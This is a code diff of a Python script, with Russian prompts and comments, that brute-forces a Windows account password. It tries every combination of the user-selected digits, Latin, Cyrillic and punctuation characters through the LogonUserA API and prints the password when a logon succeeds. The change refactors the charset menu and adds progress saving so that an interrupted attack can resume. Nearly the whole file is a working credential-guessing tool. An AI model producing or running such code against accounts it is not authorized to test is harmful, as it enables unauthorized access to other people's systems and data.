@@ -4,6 +4,7 @@ import win32api
 import itertools
 import string
 import time
+import json, os
 
 time_start = int(time.time())
 # Определяем необходимые константы
@@ -14,118 +15,102 @@ LOGON32_PROVIDER_DEFAULT = 0
 account = str(input("Введите имя учетной записи: "))
 username = account  # Замените на ваше имя пользователя
 
-characters = string.digits
-
-
-
 # Добавляем русские буквы
 russian_letters = 'абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'
 
-digits = str(input("Вы хотите использовать числа для подбора: ( Y/n ) "))
-if digits == "Y" or digits == "y" or digits == "Д" or digits == "д":
-    characters = string.digits
+characters = ''
+level = 0
+req_types = ["Вы хотите использовать числа для подбора: ( Y/n ) ",
+             "Вы хотите использовать латинские буквы для подбора: ( Y/n ) ",
+             "Вы хотите использовать кириллицу для подбора: ( Y/n ) ",
+             "Вы хотите использовать специальные символы для подбора: ( Y/n ) "]
+while True:
 
-    ascii_letters = str(input("Вы хотите использовать латинские буквы для подбора: ( Y/n ) "))
-
-    if ascii_letters == "Y" or ascii_letters == "y" or ascii_letters == "Д" or ascii_letters == "д":
-        characters = string.digits + string.ascii_letters
-
-        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))
-
-        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
-            characters = string.digits + string.ascii_letters + russian_letters
-
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = string.digits + string.ascii_letters + russian_letters +string.punctuation
-
-        else:
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = string.digits + string.ascii_letters + string.punctuation
+    if level == 4:
+        break
+    level += 1
+    digits = str(input(f"{req_types[level - 1]}: "))
+    if digits.lower() in ["y", "д"]:
+        if level == 1:
+            characters += string.digits
+        if level == 2:
+            characters += string.ascii_letters
+        if level == 3:
+            characters += russian_letters
+        if level == 4:
+            characters += string.punctuation
+    elif digits.lower() in ["n", "н"]:
+        pass
     else:
-        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))
+        print("Вы неправильно ввели, а нужно ( y / n )!")
+        level -= 1
 
-        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
-            characters = string.digits + russian_letters
+progress_file = "progress.json"
 
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = string.digits + russian_letters + string.punctuation
-        
-        else:
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = string.digits + string.punctuation
+# Функция для сохранения прогресса
+def save_progress(length, try_id, tryed):
+    with open(progress_file, 'w', encoding="utf-8") as f:
+        json.dump({'length': length, 'try_id': try_id, 'tryed': tryed}, f)
 
+# Функция для загрузки прогресса
+def load_progress():
+    if os.path.exists(progress_file):
+        with open(progress_file, 'r') as f:
+            return json.load(f)
+    return None
+
+# Загрузка прогресса
+progress = load_progress()
+if progress:
+    i = progress['length']
+    try_id = progress['try_id']
+    tryed = progress['tryed']
 else:
-    ascii_letters = str(input("Вы хотите использовать буквы для подбора: ( Y/n ) "))
-    if ascii_letters == "Y" or ascii_letters == "y" or ascii_letters == "Д" or ascii_letters == "д":
-        characters = string.ascii_letters
+    i = 1
+    try_id = 0
+    tryed = []
 
-        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))
-
-        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
-            characters = string.ascii_letters + russian_letters
-
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-            
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = string.ascii_letters + russian_letters + string.punctuation
-    else:
-        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))
-
-        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
-            characters = russian_letters
-
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = russian_letters + string.punctuation
-        
-        else:
-            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
-
-            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
-                characters = string.punctuation
-
-
-
-# Начинаем с длины пароля 1
-i = 1
 found = False
 
 try:
     while not found:
         for password in itertools.product(characters, repeat=i):
             password = "".join(password)
+            if not password in tryed:
+                try_id += 1
+                # Попытка входа в систему
+                token = ctypes.c_void_p()
+                result = ctypes.windll.advapi32.LogonUserA(
+                    username.encode('utf-8'),
+                    None,  # Укажите домен, если необходимо
+                    password.encode('utf-8'),
+                    LOGON32_LOGON_INTERACTIVE,
+                    LOGON32_PROVIDER_DEFAULT,
+                    ctypes.byref(token)
+                )
 
-            # Попытка входа в систему
-            token = ctypes.c_void_p()
-            result = ctypes.windll.advapi32.LogonUserA(
-                username.encode('utf-8'),
-                None,  # Укажите домен, если необходимо
-                password.encode('utf-8'),
-                LOGON32_LOGON_INTERACTIVE,
-                LOGON32_PROVIDER_DEFAULT,
-                ctypes.byref(token)
-            )
+                if result:
+                    print(f"Попытка № {try_id} увенчалась успехом, йоу! Вход выполнен успешно для пароля: {password}")
+                    found = True
+                    break
+                else:
+                    print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
+                    tryed.append(password)
 
-            if result:
-                print("Вход выполнен успешно!", password)
-                found = True
-                break
-            else:
-                print("Ошибка входа:", win32api.GetLastError(), password)
+                # Сохраняем прогресс после каждой попытки
+                save_progress(i, try_id, tryed)
 
         # Увеличиваем длину пароля, если не нашли подходящий
         if not found:
             i += 1
 
+except KeyboardInterrupt:
+    # Сохраняем прогресс при прерывании
+    save_progress(i, try_id, tryed)
+    print("Программа прервана. Прогресс сохранен.")
+
 except Exception as ex:
-    print("Произошла ошибка:", ex)
+    print("Произошла ошибка: ", ex)
 
 time_finish = int(time.time() - time_start)
 print(f"{time_finish} секунд(ы)")
